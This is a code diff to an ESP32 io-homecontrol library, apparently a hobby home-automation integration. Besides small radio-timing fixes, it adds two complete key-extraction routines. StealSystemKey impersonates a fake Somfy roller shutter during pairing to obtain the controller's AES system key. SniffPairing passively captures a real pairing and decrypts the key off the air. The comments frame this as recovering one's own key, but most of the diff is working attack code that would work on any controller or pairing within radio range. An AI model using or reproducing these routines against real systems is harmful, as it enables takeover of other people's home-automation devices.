@@ -247,6 +247,19 @@ namespace iohome
     IoHomeControl *ioHome = static_cast<IoHomeControl *>(arg);
     uint32_t currentFrequency = FREQUENCY_CHANNEL_2;
     TickType_t waitTime = CHANNEL_HOP_TIME_US * portTICK_PERIOD_MS / 1000;
+#ifdef CONFIG_IOHOMECONTROL_SX1262_DIAG_SNIFFER
+    // In sniffer mode the regular hop period (CHANNEL_HOP_TIME_US = 2.7 ms) hammers the radio
+    // mutex while the IRQ handler is busy reading and dumping a 240-byte capture, which causes
+    // back-to-back "SetFrequency - No mutex available!" errors and ultimately stalls RX. Slow
+    // it down to a user-configurable dwell time (Kconfig: SX1262_DIAG_SNIFFER_HOP_MS, default
+    // 1000 ms; set to 0 to pin to channel 2 forever).
+    constexpr int32_t kSnifferHopMs = CONFIG_IOHOMECONTROL_SX1262_DIAG_SNIFFER_HOP_MS;
+    const TickType_t snifferHopTicks = (kSnifferHopMs > 0) ? pdMS_TO_TICKS(kSnifferHopMs) : portMAX_DELAY;
+    waitTime = snifferHopTicks;
+    ESP_LOGW("io-hctrl", "process_radio_task: SNIFFER mode - hop period overridden to %d ms (%s)",
+             (int)kSnifferHopMs,
+             (kSnifferHopMs > 0) ? "rotating slowly" : "pinned to channel 2");
+#endif
     for (;;)
     {
       if (xQueueReceive(sRadioRxFramesQueue, &item, waitTime))
@@ -336,11 +349,44 @@ namespace iohome
             nextFrequency = FREQUENCY_CHANNEL_3;
             break;
           }
+#ifdef CONFIG_IOHOMECONTROL_SX1262_DIAG_SNIFFER
+          if (kSnifferHopMs <= 0)
+          {
+            // Pinned mode: do not touch the radio frequency at all - we want to listen on
+            // whatever channel was set by the iohome init (FREQUENCY_CHANNEL_2). Just sleep.
+            waitTime = portMAX_DELAY;
+            continue;
+          }
+#endif
           if (ioHome->mRadio->SetFrequency(nextFrequency) != RADIO_ERR_NONE)
-            IO_LOGE("Error: Frequency hopping failed");
+          {
+            // Rate-limit this error: under heavy IRQ contention it can fire dozens of times
+            // per second and saturate the console, which made debugging the sniffer mode
+            // hang significantly worse.
+            static int64_t  sLastHopFailUs    = 0;
+            static uint32_t sHopFailSuppressed = 0;
+            int64_t now = esp_timer_get_time();
+            if ((now - sLastHopFailUs) > 1000000)
+            {
+              IO_LOGE("Error: Frequency hopping failed (+{} suppressed in last {} ms)",
+                      (uint32_t)sHopFailSuppressed, (long long)((now - sLastHopFailUs) / 1000));
+              sLastHopFailUs = now;
+              sHopFailSuppressed = 0;
+            }
+            else
+            {
+              sHopFailSuppressed++;
+            }
+          }
           else
+          {
             currentFrequency = nextFrequency;
+          }
+#ifdef CONFIG_IOHOMECONTROL_SX1262_DIAG_SNIFFER
+          waitTime = snifferHopTicks; // long dwell so the sniffer captures multiple bursts per channel
+#else
           waitTime = CHANNEL_HOP_TIME_US * portTICK_PERIOD_MS / 1000; // Wait up to next hop if nothing received before
+#endif
         }
       }
     }
@@ -862,6 +908,513 @@ namespace iohome
       IO_LOGE("DiscoverAndPairDevice: failed to take mutex!");
       return false;
     }
+  }
+
+  // ===========================================================================
+  // Active key extraction ("steal") - impersonate a device, drive pairing,
+  // recover the controller's system key.
+  // ===========================================================================
+
+  bool IoHomeControl::StealSystemKey(uint32_t timeout_ms)
+  {
+    // StealSystemKey is the bootstrap path out of passive mode (the user has no system key
+    // yet, that's literally why we are running this), so we explicitly do NOT require active
+    // mode here. We do, however, need to temporarily clear mPassiveMode below because
+    // TransmitFrame() unconditionally refuses to enqueue in passive mode.
+    if (!mInitialized || !mReceiving)
+    {
+      IO_LOGE("StealSystemKey: invalid state! (not initialized or not listening)");
+      return false;
+    }
+
+    // Fake device identity. Pick something that is unlikely to collide with a real device
+    // and is not a broadcast address (00 00 3B / 00 00 3F).
+    const uint8_t fakeNodeId[NODE_ID_SIZE] = {0xCA, 0xFE, 0xBA};
+    const DeviceType fakeType = DeviceType::ROLLER_SHUTTER;
+    const uint8_t fakeSubtype = 0x00;
+    const Manufacturer fakeManufacturer = Manufacturer::SOMFY;
+
+    if (!xSemaphoreTake(sMutex, MUTEX_MAX_WAIT_TICKS))
+    {
+      IO_LOGE("StealSystemKey: failed to take mutex!");
+      return false;
+    }
+
+    UBaseType_t currentPriority = uxTaskPriorityGet(NULL);
+    vTaskPrioritySet(NULL, IO_FRAME_PROCESSING_TASK);
+
+    // Temporarily disable passive mode so TransmitFrame() will accept our outgoing frames.
+    // We restore the original value in cleanup so subsequent operation stays passive if it
+    // was passive to begin with.
+    const bool savedPassiveMode = mPassiveMode;
+    mPassiveMode = false;
+    if (savedPassiveMode)
+    {
+      IO_LOGI("StealSystemKey: temporarily disabling passive mode for TX during pairing");
+    }
+
+    // Drain stale RX frames so we don't process pre-steal noise.
+    {
+      RxFrameQueueItem stale;
+      while (xQueueReceive(sRxIoQueue, &stale, 0))
+        ;
+    }
+
+    enum class StealState
+    {
+      WAITING_FOR_DISCOVER_REQUEST, // expect 0x28 broadcast
+      WAITING_FOR_KEY_INIT,         // expect 0x31 (or optional 0x2C) addressed to fakeNodeId
+      WAITING_FOR_KEY_TRANSFER,     // expect 0x32 addressed to fakeNodeId
+      DONE
+    };
+
+    StealState state = StealState::WAITING_FOR_DISCOVER_REQUEST;
+    uint8_t controllerNodeId[NODE_ID_SIZE] = {0};
+    uint8_t challenge[HMAC_SIZE] = {0};
+    uint8_t keyInitCmdByte = 0;
+    bool success = false;
+
+    IO_LOGI("StealSystemKey: starting (fake_id={}, type={:#04x}, mfg={:#04x}, timeout={}ms)",
+            buffToHexString(NODE_ID_SIZE, fakeNodeId),
+            static_cast<uint8_t>(fakeType),
+            static_cast<uint8_t>(fakeManufacturer),
+            timeout_ms);
+    IO_LOGI("StealSystemKey: put your controller (e.g. Tahoma) in 'Add device' mode now");
+    IO_LOGI("StealSystemKey: (the IO-Homecontrol protocol is controller-initiated - we wait for");
+    IO_LOGI("StealSystemKey: a broadcast 0x28 from Tahoma, no TX from us until then).");
+
+    const int64_t deadline = esp_timer_get_time() + (int64_t)timeout_ms * 1000;
+    int64_t now;
+
+    constexpr int64_t HEARTBEAT_PERIOD_US = 10 * 1000 * 1000; // every 10 s, log "still waiting"
+    int64_t lastHeartbeatUs = esp_timer_get_time();
+
+    while (state != StealState::DONE && (now = esp_timer_get_time()) < deadline)
+    {
+      // Periodic heartbeat so the user knows the listener is alive.
+      if ((now - lastHeartbeatUs) >= HEARTBEAT_PERIOD_US)
+      {
+        const int remainingS = (int)((deadline - now) / 1000000);
+        const char *stateStr = "?";
+        switch (state)
+        {
+        case StealState::WAITING_FOR_DISCOVER_REQUEST: stateStr = "WAITING_FOR_DISCOVER_REQUEST"; break;
+        case StealState::WAITING_FOR_KEY_INIT:         stateStr = "WAITING_FOR_KEY_INIT"; break;
+        case StealState::WAITING_FOR_KEY_TRANSFER:     stateStr = "WAITING_FOR_KEY_TRANSFER"; break;
+        case StealState::DONE:                         stateStr = "DONE"; break;
+        }
+        IO_LOGI("StealSystemKey: still listening (state={}, {}s remaining)", stateStr, remainingS);
+        lastHeartbeatUs = now;
+      }
+
+      // Bound the queue wait to the next heartbeat tick so we keep printing progress.
+      const int64_t nextEventUs = lastHeartbeatUs + HEARTBEAT_PERIOD_US;
+      const int64_t sliceUs = std::max<int64_t>(50000, nextEventUs - now);
+      const TickType_t waitTicks = pdMS_TO_TICKS(sliceUs / 1000);
+
+      RxFrameQueueItem rxItem;
+      if (!xQueueReceive(sRxIoQueue, &rxItem, waitTicks))
+        continue; // slice ended without RX, loop and re-check timers
+
+      const uint8_t cmd = rxItem.frame.command_id;
+      const bool forUs = (memcmp(rxItem.frame.dest_node, fakeNodeId, NODE_ID_SIZE) == 0);
+
+      switch (state)
+      {
+      case StealState::WAITING_FOR_DISCOVER_REQUEST:
+      {
+        if (cmd != CMD_DISCOVER_REQUEST)
+        {
+          // Quietly ignore other traffic - this is the noisy phase.
+          continue;
+        }
+        // Controller-initiated flow (the only flow IO-Homecontrol actually defines).
+        memcpy(controllerNodeId, rxItem.frame.src_node, NODE_ID_SIZE);
+        IO_LOGI("StealSystemKey: got DISCOVER_REQUEST (0x28) from controller {} on {:.2f} MHz",
+                buffToHexString(NODE_ID_SIZE, controllerNodeId),
+                rxItem.frequency / 1000000.0);
+
+        IoFrame resp;
+        if (!create_discovery_response(resp, fakeNodeId, controllerNodeId, fakeType, fakeSubtype, fakeManufacturer))
+        {
+          IO_LOGE("StealSystemKey: failed to build DISCOVER_RESPONSE");
+          goto cleanup;
+        }
+        if (!TransmitFrame(resp, rxItem.frequency, SHORT_PREAMBLE_LENGTH))
+        {
+          IO_LOGE("StealSystemKey: failed to enqueue DISCOVER_RESPONSE");
+          goto cleanup;
+        }
+        IO_LOGI("StealSystemKey: sent DISCOVER_RESPONSE (0x29) - waiting for KEY_INIT_TRANSFER (0x31)");
+        state = StealState::WAITING_FOR_KEY_INIT;
+        break;
+      }
+
+      case StealState::WAITING_FOR_KEY_INIT:
+      {
+        if (cmd == CMD_DISCOVER_REQUEST)
+        {
+          // Controller may rebroadcast 0x28 on another channel before sending 0x31 - re-respond
+          // to keep our 0x29 fresh on whichever channel Tahoma is currently on.
+          IoFrame resp;
+          if (create_discovery_response(resp, fakeNodeId, rxItem.frame.src_node, fakeType, fakeSubtype, fakeManufacturer))
+            TransmitFrame(resp, rxItem.frequency, SHORT_PREAMBLE_LENGTH);
+          continue;
+        }
+        if (cmd == CMD_DISCOVER_CONFIRMATION && forUs)
+        {
+          // Optional 0x2C ACK from the controller (some flows / sub-device variants insert
+          // this between 0x29 and 0x31). Respond with 0x2D and keep waiting for 0x31.
+          IO_LOGI("StealSystemKey: got DISCOVER_CONFIRMATION (0x2C) - sending DISCOVER_CONFIRMATION_ACK (0x2D)");
+          IoFrame ack;
+          if (create_discovery_confirmation_ack(ack, fakeNodeId, controllerNodeId))
+            TransmitFrame(ack, rxItem.frequency, SHORT_PREAMBLE_LENGTH);
+          continue;
+        }
+        if (cmd != CMD_KEY_INIT_TRANSFER || !forUs)
+        {
+          // DIAGNOSTIC: log everything else we see while waiting for 0x31 - this tells us
+          // what Tahoma is actually doing (e.g., is it sending 0x46, 0x4A, 0x6F, status
+          // updates, or just more 0x28s?). The unexpected branch is the one that matters
+          // for debugging "Tahoma never proceeds to 0x31".
+          IO_LOGI("StealSystemKey: ignoring frame: cmd=0x{:02X} src={} dst={} (forUs={}) data_len={} freq={:.2f} MHz",
+                  cmd,
+                  buffToHexString(NODE_ID_SIZE, rxItem.frame.src_node),
+                  buffToHexString(NODE_ID_SIZE, rxItem.frame.dest_node),
+                  forUs ? 1 : 0,
+                  rxItem.frame.data_len,
+                  rxItem.frequency / 1000000.0);
+          continue;
+        }
+        keyInitCmdByte = cmd; // = 0x31 - used as IV input when decrypting 0x32
+        IO_LOGI("StealSystemKey: got KEY_INIT_TRANSFER (0x31) - sending CHALLENGE_REQUEST (0x3C)");
+
+        IoFrame chal;
+        if (!create_challenge_request(chal, controllerNodeId, fakeNodeId))
+        {
+          IO_LOGE("StealSystemKey: failed to build CHALLENGE_REQUEST");
+          goto cleanup;
+        }
+        // create_challenge_request generated and embedded a random challenge - capture it so we
+        // can use it to decrypt the upcoming KEY_TRANSFER.
+        if (chal.data_len != HMAC_SIZE)
+        {
+          IO_LOGE("StealSystemKey: unexpected challenge frame length {}", chal.data_len);
+          goto cleanup;
+        }
+        memcpy(challenge, chal.data, HMAC_SIZE);
+
+        if (!TransmitFrame(chal, rxItem.frequency, SHORT_PREAMBLE_LENGTH))
+        {
+          IO_LOGE("StealSystemKey: failed to enqueue CHALLENGE_REQUEST");
+          goto cleanup;
+        }
+        state = StealState::WAITING_FOR_KEY_TRANSFER;
+        break;
+      }
+
+      case StealState::WAITING_FOR_KEY_TRANSFER:
+      {
+        if (cmd != CMD_KEY_TRANSFER || !forUs)
+          continue;
+        if (rxItem.frame.data_len != AES_KEY_SIZE)
+        {
+          IO_LOGE("StealSystemKey: KEY_TRANSFER has unexpected data_len {} (expected {})",
+                  rxItem.frame.data_len, AES_KEY_SIZE);
+          goto cleanup;
+        }
+
+        uint8_t systemKey[AES_KEY_SIZE];
+        if (!iohome::crypto::crypt_2w_key(&keyInitCmdByte, 1, challenge, rxItem.frame.data, systemKey))
+        {
+          IO_LOGE("StealSystemKey: crypt_2w_key failed!");
+          goto cleanup;
+        }
+
+        // Send the confirmation so the controller marks pairing successful and stops retrying.
+        IoFrame conf;
+        if (create_key_transfer_confirmation(conf, fakeNodeId, controllerNodeId))
+          TransmitFrame(conf, rxItem.frequency, SHORT_PREAMBLE_LENGTH);
+
+        // Print loudly via both the IoHomeControl logger AND ESP_LOG so the user can't miss it.
+        const std::string controllerHex = buffToHexString(NODE_ID_SIZE, controllerNodeId);
+        const std::string systemKeyHex = buffToHexString(AES_KEY_SIZE, systemKey);
+        IO_LOGI("===========================================================");
+        IO_LOGI("StealSystemKey: SUCCESS!");
+        IO_LOGI("  Controller (Tahoma) node_id : {}", controllerHex);
+        IO_LOGI("  Recovered system_key        : {}", systemKeyHex);
+        IO_LOGI("  Copy these into your sdkconfig:");
+        IO_LOGI("    CONFIG_IOHOMECONTROL_OWN_NODE_ID=\"{}\"", controllerHex);
+        IO_LOGI("    CONFIG_IOHOMECONTROL_SYSTEM_KEY=\"{}\"", systemKeyHex);
+        IO_LOGI("===========================================================");
+        ESP_LOGW(TAG, "===== STEAL SUCCESS =====");
+        ESP_LOGW(TAG, "controller node_id : %s", controllerHex.c_str());
+        ESP_LOGW(TAG, "system_key         : %s", systemKeyHex.c_str());
+        ESP_LOGW(TAG, "=========================");
+
+        success = true;
+        state = StealState::DONE;
+        break;
+      }
+
+      case StealState::DONE:
+        break;
+      }
+    }
+
+    if (!success)
+    {
+      const char *stage = "unknown";
+      switch (state)
+      {
+      case StealState::WAITING_FOR_DISCOVER_REQUEST: stage = "no DISCOVER_REQUEST received"; break;
+      case StealState::WAITING_FOR_KEY_INIT:         stage = "no KEY_INIT_TRANSFER received (controller may not have accepted our DISCOVER_RESPONSE)"; break;
+      case StealState::WAITING_FOR_KEY_TRANSFER:     stage = "no KEY_TRANSFER received"; break;
+      case StealState::DONE:                         stage = "internal error"; break;
+      }
+      IO_LOGE("StealSystemKey: timed out ({}). Try again, ensuring no real device is in pair mode.", stage);
+    }
+
+  cleanup:
+    mPassiveMode = savedPassiveMode;
+    vTaskPrioritySet(NULL, currentPriority);
+    xSemaphoreGive(sMutex);
+    return success;
+  }
+
+  bool IoHomeControl::SniffPairing(uint32_t timeout_ms)
+  {
+    // Purely passive: we never TX. The whole point of this method is to sit on the air,
+    // watch a real controller<->device pairing happen, and decrypt the system key off-line.
+    // Therefore we do NOT need (and intentionally do not touch) mPassiveMode here.
+    if (!mInitialized || !mReceiving)
+    {
+      IO_LOGE("SniffPairing: invalid state! (not initialized or not listening)");
+      return false;
+    }
+
+    if (!xSemaphoreTake(sMutex, MUTEX_MAX_WAIT_TICKS))
+    {
+      IO_LOGE("SniffPairing: failed to take mutex!");
+      return false;
+    }
+
+    UBaseType_t currentPriority = uxTaskPriorityGet(NULL);
+    vTaskPrioritySet(NULL, IO_FRAME_PROCESSING_TASK);
+
+    // Drain stale RX frames so we don't latch onto noise from before the user started.
+    {
+      RxFrameQueueItem stale;
+      while (xQueueReceive(sRxIoQueue, &stale, 0))
+        ;
+    }
+
+    enum class SniffState
+    {
+      WAIT_KEY_INIT,     // expect 0x31 controller -> device (any pair)
+      WAIT_CHALLENGE,    // expect 0x3C device -> controller (matching pair)
+      WAIT_KEY_TRANSFER, // expect 0x32 controller -> device (matching pair)
+      DONE
+    };
+
+    SniffState state = SniffState::WAIT_KEY_INIT;
+    uint8_t controllerId[NODE_ID_SIZE] = {0}; // src of 0x31 (Tahoma)
+    uint8_t deviceId[NODE_ID_SIZE]     = {0}; // dst of 0x31 (the real device)
+    uint8_t challenge[HMAC_SIZE]       = {0};
+    uint8_t keyInitCmdByte             = CMD_KEY_INIT_TRANSFER; // 0x31, fed into IV
+    bool    success                    = false;
+
+    IO_LOGI("SniffPairing: starting (timeout={}ms, purely passive - no TX)", timeout_ms);
+    IO_LOGI("SniffPairing: trigger a real pairing now: put controller in 'Add device' mode");
+    IO_LOGI("SniffPairing: AND start pairing on a real IO-Homecontrol device (e.g. factory");
+    IO_LOGI("SniffPairing: reset + button press) within {}s.", timeout_ms / 1000);
+
+    const int64_t deadline = esp_timer_get_time() + (int64_t)timeout_ms * 1000;
+    int64_t now;
+
+    constexpr int64_t HEARTBEAT_PERIOD_US = 10 * 1000 * 1000;
+    int64_t lastHeartbeatUs = esp_timer_get_time();
+
+    while (state != SniffState::DONE && (now = esp_timer_get_time()) < deadline)
+    {
+      if ((now - lastHeartbeatUs) >= HEARTBEAT_PERIOD_US)
+      {
+        const int remainingS = (int)((deadline - now) / 1000000);
+        const char *stateStr = "?";
+        switch (state)
+        {
+        case SniffState::WAIT_KEY_INIT:     stateStr = "WAIT_KEY_INIT (0x31)"; break;
+        case SniffState::WAIT_CHALLENGE:    stateStr = "WAIT_CHALLENGE (0x3C)"; break;
+        case SniffState::WAIT_KEY_TRANSFER: stateStr = "WAIT_KEY_TRANSFER (0x32)"; break;
+        case SniffState::DONE:              stateStr = "DONE"; break;
+        }
+        IO_LOGI("SniffPairing: still listening (state={}, {}s remaining)", stateStr, remainingS);
+        lastHeartbeatUs = now;
+      }
+
+      const int64_t nextEventUs = lastHeartbeatUs + HEARTBEAT_PERIOD_US;
+      const int64_t sliceUs = std::max<int64_t>(50000, nextEventUs - now);
+      const TickType_t waitTicks = pdMS_TO_TICKS(sliceUs / 1000);
+
+      RxFrameQueueItem rxItem;
+      if (!xQueueReceive(sRxIoQueue, &rxItem, waitTicks))
+        continue;
+
+      const uint8_t cmd = rxItem.frame.command_id;
+
+      switch (state)
+      {
+      case SniffState::WAIT_KEY_INIT:
+      {
+        if (cmd != CMD_KEY_INIT_TRANSFER)
+        {
+          // Lots of noise in this phase (status updates, button presses, ...). Skip silently.
+          continue;
+        }
+        memcpy(controllerId, rxItem.frame.src_node, NODE_ID_SIZE);
+        memcpy(deviceId,     rxItem.frame.dest_node, NODE_ID_SIZE);
+        keyInitCmdByte = cmd; // = 0x31
+        IO_LOGI("SniffPairing: KEY_INIT_TRANSFER (0x31) seen: controller={} -> device={} on {:.2f} MHz",
+                buffToHexString(NODE_ID_SIZE, controllerId),
+                buffToHexString(NODE_ID_SIZE, deviceId),
+                rxItem.frequency / 1000000.0);
+        state = SniffState::WAIT_CHALLENGE;
+        break;
+      }
+
+      case SniffState::WAIT_CHALLENGE:
+      {
+        // Expect 0x3C from the device back to the controller, with a 6-byte challenge.
+        const bool fromDevice = (memcmp(rxItem.frame.src_node, deviceId, NODE_ID_SIZE) == 0);
+        const bool toController = (memcmp(rxItem.frame.dest_node, controllerId, NODE_ID_SIZE) == 0);
+
+        if (cmd == CMD_KEY_INIT_TRANSFER)
+        {
+          // Controller may rebroadcast 0x31 - just refresh and keep waiting on 0x3C.
+          IO_LOGI("SniffPairing: another KEY_INIT_TRANSFER seen, still waiting for CHALLENGE");
+          continue;
+        }
+        if (cmd != CMD_CHALLENGE_REQUEST || !fromDevice || !toController)
+        {
+          IO_LOGI("SniffPairing: ignoring frame in WAIT_CHALLENGE: cmd=0x{:02X} src={} dst={} (data_len={})",
+                  cmd,
+                  buffToHexString(NODE_ID_SIZE, rxItem.frame.src_node),
+                  buffToHexString(NODE_ID_SIZE, rxItem.frame.dest_node),
+                  rxItem.frame.data_len);
+          continue;
+        }
+        if (rxItem.frame.data_len != HMAC_SIZE)
+        {
+          IO_LOGI("SniffPairing: 0x3C has unexpected data_len {} (expected {}) - ignoring",
+                  rxItem.frame.data_len, HMAC_SIZE);
+          continue;
+        }
+        memcpy(challenge, rxItem.frame.data, HMAC_SIZE);
+        IO_LOGI("SniffPairing: CHALLENGE_REQUEST (0x3C) seen: challenge={}",
+                buffToHexString(HMAC_SIZE, challenge));
+        state = SniffState::WAIT_KEY_TRANSFER;
+        break;
+      }
+
+      case SniffState::WAIT_KEY_TRANSFER:
+      {
+        const bool fromController = (memcmp(rxItem.frame.src_node, controllerId, NODE_ID_SIZE) == 0);
+        const bool toDevice       = (memcmp(rxItem.frame.dest_node, deviceId, NODE_ID_SIZE) == 0);
+
+        if (cmd == CMD_KEY_INIT_TRANSFER && fromController && toDevice)
+        {
+          IO_LOGI("SniffPairing: handshake retry seen (0x31 again) - re-arming from CHALLENGE");
+          state = SniffState::WAIT_CHALLENGE;
+          continue;
+        }
+        if (cmd == CMD_CHALLENGE_REQUEST)
+        {
+          // Stale 0x3C from another channel - re-capture, in case the device and controller
+          // are mid-retry and the previous challenge is now invalid.
+          if (rxItem.frame.data_len == HMAC_SIZE
+              && memcmp(rxItem.frame.src_node, deviceId, NODE_ID_SIZE) == 0
+              && memcmp(rxItem.frame.dest_node, controllerId, NODE_ID_SIZE) == 0)
+          {
+            memcpy(challenge, rxItem.frame.data, HMAC_SIZE);
+            IO_LOGI("SniffPairing: refreshed challenge from another 0x3C: {}",
+                    buffToHexString(HMAC_SIZE, challenge));
+          }
+          continue;
+        }
+        if (cmd != CMD_KEY_TRANSFER || !fromController || !toDevice)
+        {
+          IO_LOGI("SniffPairing: ignoring frame in WAIT_KEY_TRANSFER: cmd=0x{:02X} src={} dst={} (data_len={})",
+                  cmd,
+                  buffToHexString(NODE_ID_SIZE, rxItem.frame.src_node),
+                  buffToHexString(NODE_ID_SIZE, rxItem.frame.dest_node),
+                  rxItem.frame.data_len);
+          continue;
+        }
+        if (rxItem.frame.data_len != AES_KEY_SIZE)
+        {
+          IO_LOGE("SniffPairing: 0x32 has unexpected data_len {} (expected {})",
+                  rxItem.frame.data_len, AES_KEY_SIZE);
+          goto cleanup;
+        }
+
+        const std::string encryptedHex = buffToHexString(AES_KEY_SIZE, rxItem.frame.data);
+        const std::string challengeHex = buffToHexString(HMAC_SIZE, challenge);
+        IO_LOGI("SniffPairing: KEY_TRANSFER (0x32) seen, encrypted_key={}", encryptedHex);
+
+        uint8_t systemKey[AES_KEY_SIZE];
+        if (!iohome::crypto::crypt_2w_key(&keyInitCmdByte, 1, challenge, rxItem.frame.data, systemKey))
+        {
+          IO_LOGE("SniffPairing: crypt_2w_key failed!");
+          goto cleanup;
+        }
+
+        const std::string controllerHex = buffToHexString(NODE_ID_SIZE, controllerId);
+        const std::string deviceHex     = buffToHexString(NODE_ID_SIZE, deviceId);
+        const std::string systemKeyHex  = buffToHexString(AES_KEY_SIZE, systemKey);
+
+        IO_LOGI("===========================================================");
+        IO_LOGI("SniffPairing: SUCCESS!");
+        IO_LOGI("  Controller (Tahoma) node_id : {}", controllerHex);
+        IO_LOGI("  Device that paired          : {}", deviceHex);
+        IO_LOGI("  Captured challenge          : {}", challengeHex);
+        IO_LOGI("  Captured encrypted key      : {}", encryptedHex);
+        IO_LOGI("  Recovered system_key        : {}", systemKeyHex);
+        IO_LOGI("  Copy these into your sdkconfig:");
+        IO_LOGI("    CONFIG_IOHOMECONTROL_OWN_NODE_ID=\"{}\"", controllerHex);
+        IO_LOGI("    CONFIG_IOHOMECONTROL_SYSTEM_KEY=\"{}\"", systemKeyHex);
+        IO_LOGI("===========================================================");
+        ESP_LOGW(TAG, "===== SNIFF SUCCESS =====");
+        ESP_LOGW(TAG, "controller node_id : %s", controllerHex.c_str());
+        ESP_LOGW(TAG, "system_key         : %s", systemKeyHex.c_str());
+        ESP_LOGW(TAG, "=========================");
+
+        success = true;
+        state = SniffState::DONE;
+        break;
+      }
+
+      case SniffState::DONE:
+        break;
+      }
+    }
+
+    if (!success)
+    {
+      const char *stage = "unknown";
+      switch (state)
+      {
+      case SniffState::WAIT_KEY_INIT:     stage = "no 0x31 KEY_INIT_TRANSFER seen"; break;
+      case SniffState::WAIT_CHALLENGE:    stage = "saw 0x31 but no matching 0x3C CHALLENGE_REQUEST"; break;
+      case SniffState::WAIT_KEY_TRANSFER: stage = "saw 0x31+0x3C but no matching 0x32 KEY_TRANSFER"; break;
+      case SniffState::DONE:              stage = "internal error"; break;
+      }
+      IO_LOGE("SniffPairing: timed out ({}). Try again with the device's pair sequence triggered cleanly.", stage);
+    }
+
+  cleanup:
+    vTaskPrioritySet(NULL, currentPriority);
+    xSemaphoreGive(sMutex);
+    return success;
   }
 
   bool IoHomeControl::SetDevicePosition(const std::string &deviceID, uint8_t position, bool quiet)
